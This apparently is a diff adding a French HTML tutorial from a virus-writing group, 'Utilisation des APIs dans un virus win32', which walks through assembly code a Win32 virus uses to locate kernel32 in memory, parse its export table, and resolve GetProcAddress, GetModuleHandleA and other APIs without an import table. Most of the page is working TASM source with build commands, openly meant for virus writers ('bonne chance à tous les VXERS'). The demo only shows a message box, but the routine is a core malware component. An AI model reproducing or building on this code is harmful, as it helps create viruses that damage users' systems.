@@ -1,0 +1,351 @@
+<html>
+<head>
+<title>Win32 viruses - Utilisation des APIs</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{  Utilisation des APIs dans un virus win32  }}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center> </font> </pre> <font size=3 color=#ffffff>
+<br>
+Le but d'un virus win32 c'est quand même d'utiliser les APIs win32. Le problème
+c'est que le virus ne connait pas l'adresse permettant d'appeler ces APIs.
+La première chose à faire est bien sur de localiser le kernel. Prenez un des
+exemples expliqués avant ce tutorial. Ici j'utiliserais la méthode de la pile
+car c'est la plus intéressante. Dans les listings que vous verrez, les variables
+sont placés avant chaque bout de code. C'est juste pour simplifier la compréhension.
+Ces varaibles se placent normalement en début de code et en fin de code dans le
+cas d'un virus. Dans tout ce qui va suivre ebp sera la valeur
+du delta offset. Je me fiche de la manière dont vous le prenez, cela ne change
+rien au reste. En voici un petit exemple pour ceux qui ne savent pas le faire:
+<font color=#FF0000 size=3>
+<pre>
+	call	delta                          ; Calcul du delta offset
+delta:                                         ;
+	pop	ebp                            ;
+	sub	ebp, offset delta              ;
+</font></pre>
+Ensuite vient donc la recherche du kernel (voir cours d'avant):
+<font color=#FF0000 size=3>
+<pre>
+kernel32 dd 0
+PeHeader dd 0
+;*******************************************************************************
+;  Kernel Search Proc
+;*******************************************************************************
+                                               ;
+mov	edx, [esp]                             ; Methode de la pile
+mov	eax,edx                                ; On sauve cette valeur
+                                               ;
+AND	edx,0FFFF0000h                         ; On diminue la recherche
+inc edx                                        ;
+                                               ;
+boucle:                                        ;
+	dec	edx                            ; un cran de moins
+	cmp	word ptr [edx], "ZM"           ; Cherche le MZ Header
+	jnz	boucle                         ; on repart
+                                               ;
+MZ_found:                                      ;
+	mov	ecx, edx                       ;
+	mov	ecx, [ecx+03ch]                ;
+	add	ecx, edx                       ;
+	cmp	ecx, eax                       ;
+	jg	boucle                         ; vérifie que c'est une adresse valide
+	cmp	word ptr [ecx] , "EP"          ; On a le PeHeader ?
+	jnz	boucle                         ; Non ! on repart
+                                               ;
+	mov	[ebp+kernel32], edx            ; stocke l'ImageBase du kernel
+	mov	[ebp+PeHeader], ecx            ; stocke L'ImageBase du PeHeader
+                                               ;
+                                               ;
+</font></pre>
+Jusqu'ici rien de nouveau donc. Ensuite on va rechercher kernel32 puis on va aller
+à l'export table chercher quelques informations (une bonne documentation
+sur les Headers est nécéssaire. ps: j'ai appris grace aux tuts de Lord Julus et
+j'ai gardé les mêmes noms de variables ;)
+<font color=#FF0000 size=3>
+<pre>
+AddName  dd 0
+AddFunc  dd 0
+AddOrd   dd 0
+;*******************************************************************************
+;  APIs Search Routine
+;  kernel32 = ImageBase du kernel
+;  PeHeader = ImageBase du PeHeader
+;*******************************************************************************
+                                               ;
+	mov	edi, [ebp+PeHeader]            ; EDI = adresse du PeHeader
+                                               ;
+	mov	esi, [edi+78H]                 ; 78H = addresse de l'export table
+	add	esi, [ebp+kernel32]            ; on additionne l'ImageBase de kernel32
+                                               ; esi pointe l'export table
+	mov	edi, [esi+12]                  ;
+	add	edi, [ebp+kernel32]            ;
+	cmp	dword ptr [edi], "NREK"        ; on a bien l'export table du Kernel ?
+	jne	erreur                         ;
+                                               ;
+	mov	eax, dword ptr [esi+18h]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+limit], eax               ; Nombre de noms de fonctions
+                                               ;
+	mov	eax, dword ptr [esi+1Ch]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+AddFunc], eax             ; Adresses des fonctions exportés
+                                               ;
+	mov	eax, dword ptr [esi+20h]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+AddName], eax             ; Adresses des noms des fonctions exportés
+                                               ;
+	mov	eax, dword ptr [esi+24h]       ;
+	add	eax, [ebp+kernel32]            ;
+	mov	[ebp+AddOrd], eax              ; adresses des exported oridinals
+
+;-------------------------------------------------------------------------------
+; On a tous les ingrédients, partons à la pêche aux APIs
+;-------------------------------------------------------------------------------
+</font></pre>
+Un listing est, je pense plus simple que des explications pour cette partie.
+Maintenant qu'on a réuni assez d'infos sur notre export table il faut commencer
+à scanner et rechercher l'API GetProcAddress qui est la base de tout.
+Le code est expliqué au maximum pour pouvoir comprendre (ps: la partie qui suis
+est TRES ressemblante au code de Lord Julus à quelques modifications près):
+<font color=#FF0000 size=3>
+<pre>
+First_API          db  "GetProcAddress",0
+AGetProcAddress    dd  0
+Nindex             dd  0 ;celui la il nous sert à chopper les adresses ou sont stockés les
+                         ;adresses des APIs
+
+
+	mov	esi, [ebp+AddName]             ; ESI = premier pointeur sur une adresse
+	mov	[ebp+Nindex], esi              ; Nindex = adresse des adresses des fonctions
+	mov	edi, [esi]                     ; on normalise
+	add	edi, [ebp+kernel32]            ; EDI = pointeur sur la liste des noms
+	mov	ecx, 0                         ; ECX = compteur à 0
+	lea	ebx, [ebp+First_API]           ; GetProcAddress.
+                                               ;
+   onrepart:                                   ;
+	mov	esi, ebx                       ; ESI pointe sur le nom
+                                               ; qu'on recherche (GetProcAddress)
+   compare:                                    ;
+	cmpsb                                  ; les 2 bytes sont pareils ?
+	jne	prochain                       ; non ! on essaie une autre fonction
+                                               ;
+	cmp	byte ptr [edi], 0              ; le buffer entier est correct ?
+	je	cavachier                      ; YES !
+	jmp	compare                        ; non... on essaie le prochain byte
+                                               ;
+   prochain:                                   ;
+	inc	cx                             ; incremente le compteur
+	cmp	cx, word ptr [ebp+limit]       ; on vérifie qu'on ne dépasse pas la limite
+	jge	erreur                         ; sinon erreur
+                                               ;
+	add	dword ptr [ebp+Nindex], 4      ; on choppe le prochain pointeur
+	mov	esi, [ebp+Nindex]              ; on refait la manip
+	mov	edi, [esi]                     ; EDI = pointeur sur la prochaine fonction
+	add	edi, [ebp+kernel32]            ; on normalise
+	jmp	onrepart                       ; et on repart...
+                                               ;
+</font></pre>
+La partie au dessus est la plus difficile à comprendre, c'est aussi la partie où j'ai
+longtemps bloqué. AddName représente en fait un long tableau (pour les coders c) où
+l'ont peux trouver les adresses qui pointent sur des noms de fonctions.
+Nindex nous sert à prendre ces adresses une par une. L'algo ci dessus fait pointer
+edi sur les noms de fonctions et esi sur le nom de l'API que l'on recherche (GetProcAddress).
+ensuite il compare les deux noms lettres par lettres. Si une lettre ne correspond pas
+le programme fait pointer edi sur le prochain nom de fonction.
+Quand il a trouvé la bonne API, il saute sur "cavachier" (arf j'ai un peu de mal pour
+choisir les noms de labels ;) Arrivé la on a une petite equation qui nous donne
+l'adresse de notre fonction. Je laisse la parole à LJ ;):<br><br>
+
+cx = the index into the Address of Ordinals<br><br>
+    
+Having CX we have the following formulas:<br><br>
+    
+CX * 2 + [Address of Ordinals] = Ordinal<br>
+Ordinal * 4 + [Address of Functions] = Address of Function (RVA)<br><br>
+
+Là aussi j'en ai chié pour capter ce truc. (bah je suis pas l'élite moi ;)
+CX représente le numéro de notre API. dans AddFunc on a les adresses des fonctions.
+Une adresse étant un dword il prend 4 bytes. En additionnant (ordinal * 4) à
+l'adresse on a donc l'adresse de notre fonction. ça, ça va à peut prêt. Mais avant
+ça il faut avoir la valeur de l'ordinal. Chaque ordinal est un word donc prend 2 bytes.
+en multipliant CX par 2 puis en ajoutant l'adresse des ordinals, on pointe donc
+sur la valeur de l'ordinal voulu. Ouah ! faut matter ça à tête reposée mais on finit
+pas comprendre ;).
+Voyons donc le code. On peut remplacer les SHL par des IMUL pour simplifier le code:
+<font color=#FF0000 size=3>
+<pre>
+
+cavachier:                                     ;
+	shl	ecx, 1                         ; ECX = ECX * 2
+	mov	esi, [ebp+AddOrd]              ;
+	add	esi, ecx                       ; ajoute l'adresse des ordinals
+	xor 	eax, eax                       ;
+	mov	ax, word ptr [esi]             ; on choppe l'Ordinal
+	shl	eax, 2                         ; Ordinal = Ordinal * 4
+	mov	esi, [ebp+AddFunc]             ;
+	add	esi, eax                       ; Ajoute l'addresse des fonctions
+	mov	edi, dword ptr [esi]           ; choppe la RVA
+	add	edi, [ebp+kernel32]            ; ajoute ImageBase du kernel
+                                               ;
+	mov	[ebp+AGetProcAddress], edi     ; on le sauve ! On a gagné ! :)
+
+</font></pre>
+Après ça, le reste c'est de la rigolade. On se fait une petite fonction pour rechercher
+nos APIs à l'aide de GetProcAddress. En particulier on recherchera GetModuleHandleA
+car elle nous permettra de pouvoir utiliser des APIs contenues dans d'autres DLL.
+(d'ailleurs pourquoi pas se servir des dll opengl pour faire un virus démo ? A suivre ;)
+Bon voila la procédure. Tout d'abord il faudra déclarer vos APIs comme ceci:
+
+<font color=#FF0000 size=3>
+<pre>
+;__--==*** Apis dans Kernel32.dll ***==--__
+;¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
+
+First_API          db  "GetProcAddress",0
+NExitProcess       db  "ExitProcess",0
+NGetModuleHandleA  db  "GetModuleHandleA",0
+db 0FFh
+AGetProcAddress    dd  0
+AExitProcess       dd  0
+AGetModuleHandleA  dd  0
+</font></pre>
+le 0FF représentant la fin de la recherche. Et maintenant le code:
+
+<font color=#FF0000 size=3>
+<pre>
+;-------------------------------------------------------------------------------
+; Fonctions qui récupère toutes les APIs dont nous avons besoin
+; dans Kernel32.dll
+;-------------------------------------------------------------------------------
+                                               ;
+	lea	esi, NExitProcess              ;
+	lea	edi, AExitProcess              ; On prépare la recherche des APIs
+	add	esi, ebp                       ; On normalise
+	add	edi, ebp                       ;
+                                               ;
+find_apis:                                     ;
+                                               ;
+	push	esi                            ; Nom de l'API
+	push	[ebp+kernel32]                 ; Module de Kernel32
+	call	[ebp+AGetProcAddress]          ; API qui nous donne
+	cmp	eax,0                          ; l'adresse de l'API recherchée
+	je	erreur                         ;
+	stosd                                  ; copie l'adresse là où pointe EDI
+                                               ; puis ajoute 4 à EDI
+                                               ;
+choppe_prochaine_api:                          ;
+	inc	esi                            ; on choppe le prochain nom d'API
+	cmp byte ptr [esi], 0                  ;
+	jne choppe_prochaine_api               ;
+                                               ;
+	inc esi                                ;
+	cmp byte ptr [esi], 0FFh               ; On regarde si on est arrivé à la fin
+	jne find_apis                          ;
+
+</font></pre>
+On a donc déjà les APIs qui sont stockés dans Kernel32. Par exemple pour quitter
+le programme libre à vous de faire ceci:
+<font color=#FF0000 size=3>
+<pre>
+	push	0
+	call	[ebp+AExitProcess]
+</font></pre>
+Maintenant moi j'ai envie de faire des petites boites de messages. Il faut donc aller
+chercher l'API MessageBoxA dans user32.dll. Pour chopper l'ImageBase de user32.dll
+on va utiliser l'API GetModuleHandleA qu'on a recherchée avant:
+<font color=#FF0000 size=3>
+<pre>
+Nuser32  db "User32.dll",0
+user32   dd 0
+;-------------------------------------------------------------------------------
+; Fonctions qui récupère toutes les APIs dont nous avons besoin
+; dans User32.dll
+;-------------------------------------------------------------------------------
+
+	lea	eax, [ebp+Nuser32]             ; On prend l'ImageBase de user32.dll
+	push	eax                            ; grace à GetModuleHandle.
+	call	[ebp+AGetModuleHandleA]        ;
+	cmp	eax, 0                         ;
+	je	erreur                         ;
+	mov	[ebp+user32],eax               ; On stocke cette valeur dans user32.
+
+</font></pre>
+Et on récupère les adresses de nos APIs comme tout à l'heure:
+<font color=#FF0000 size=3>
+<pre>
+NMessageBoxA  db  "MessageBoxA",0 
+db 0FFh
+AMessageBoxA  dd  0
+
+	lea	esi, NMessageBoxA              ; On recherche en premier MessageBoxA
+	lea	edi, AMessageBoxA              ;
+	add	esi, ebp                       ; On normalise
+	add	edi, ebp                       ;
+                                               ;
+find_user_apis:                                ;
+                                               ;
+	push	esi                            ; On refait la même chose qu'avec Kernel32
+	push	[ebp+user32]                   ; pour trouver toutes les adresses des APIs
+	call	[ebp+AGetProcAddress]          ; de user32.dll dont nous avons besoin
+	cmp	eax,0                          ;
+	je	erreur                         ;
+	stosd                                  ; copie l'adresse là où pointe EDI
+                                               ; puis ajoute 4 à EDI
+choppe_user_api:                               ;
+	inc	esi                            ; on choppe le prochain nom d'API
+	cmp byte ptr [esi], 0                  ;
+	jne choppe_user_api                    ;
+                                               ;
+	inc esi                                ;
+	cmp byte ptr [esi], 0FFh               ; On regarde si on est arrivé à la fin
+	jne find_user_apis                     ;
+                                               ;
+</font></pre>
+Et voila on touche à la fin. Désormais y a plus qu'a afficher une belle boite de message
+pour voir si ça a marché:
+<font color=#FF0000 size=3>
+<pre>
+message db "Hccc Rulez",0
+titre   db "Search Routine Sucess",0
+;*******************************************************************************
+;  Fin de l' APIs Search Routine
+;*******************************************************************************
+                                               ;
+	lea	esi,[ebp+message]              ;
+	lea	edi,[ebp+titre]                ;
+	push	0                              ;
+	push	esi                            ;
+	push	edi                            ;
+	push	0                              ;
+	call	[ebp+AMessageBoxA]             ; Affiche une boite de message
+                                               ;
+	push	0                              ;
+	call	[ebp+AExitProcess]             ; Quitte
+</font></pre>
+
+Et voila c'est nikel. On compile tout avec Tasm:
+<font color=#0000FF size=3>
+<pre>
+tasm32 -ml -m5 -q win32.asm
+tlink32 -Tpe -aa -x -c win32.obj ,,,import32
+</font></pre>
+On teste le code et on a une jolie boite de message qui apparaît. ça paraît rien mais
+moi ça me fait trop tripper :).
+
+Bon le code est joint pour ceux qui veulent, et bonne chance à tous les VXERS ;)
+
+<br>
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
+
+
+
